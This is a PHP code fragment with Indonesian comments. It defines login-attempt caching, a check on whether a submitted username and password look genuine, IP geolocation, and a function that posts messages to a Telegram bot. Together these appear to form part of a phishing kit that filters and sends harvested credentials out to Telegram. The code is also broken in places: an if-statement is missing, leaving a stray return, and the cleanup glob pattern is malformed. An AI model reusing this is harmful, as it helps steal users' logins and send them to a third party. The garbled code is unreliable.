// ========== FUNGSI CACHE SEDERHANA ==========
function getAttemptCache($ip, $login_type) {
    $cache_file = sys_get_temp_dir() . '/login_cache_' . md5($ip . $login_type);
    if (file_exists($cache_file)) {
        $data = json_decode(file_get_contents($cache_file), true);
        if ($data && (time() - $data['time'] < 3600)) {
            return $data['count'];
        }
    }
    return 0;
}

function updateAttemptCache($ip, $login_type) {
    $cache_file = sys_get_temp_dir() . '/login_cache_' . md5($ip . $login_type);
    $data = [
        'time' => time(),
        'count' => getAttemptCache($ip, $login_type) + 1
    ];
    file_put_contents($cache_file, json_encode($data));
}

// ========== CEK APAKAH CREDENTIAL VALID ==========
function isValidCredential($username, $password, $common_passwords) {

    if (strlen($username) < 2 || strlen($password) < 2) {
        return false;
    }
    
    // Cek password umum

        return false;
    }
    
    // Cek apakah username mengandung password (biasanya bot)
    if (stripos($username, $password) !== false) {
        return false;
    }
    
    // Cek apakah password terlalu pendek
    if (strlen($password) < 4) {
        return false;
    }
    
    return true;
}

// ========== FUNGSI GET COUNTRY DARI IP ==========
function getCountryFromIP($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        // Coba dari ip-api.com (free, no API key needed)
        try {
            $url = "http://ip-api.com/json/{$ip}?fields=countryCode";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 2);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if ($result) {
                $data = json_decode($result, true);
                if ($data && isset($data['countryCode'])) {
                    return $data['countryCode'];
                }
            }
        } catch (Exception $e) {
            // Ignore
        }
    }
    return null;
}

// ========== FUNGSI KIRIM KE TELEGRAM ==========
function sendToTelegram($message, $bot_token, $chat_id) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $post_data = "chat_id={$chat_id}&text=" . urlencode($message) . "&parse_mode=HTML";
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    return false;
}

// ========== CLEANUP CACHE LAMA ==========
function cleanupOldCache() {
    $dir = sys_get_temp_dir();
    $pattern = '/login_cache_/';
    $files = glob($dir . $pattern . '*');
    $now = time();
    foreach ($files as $file) {
        if (file_exists($file) && ($now - filemtime($file)) > 86400) { // 24 jam
            @unlink($file);
        }
    }
}
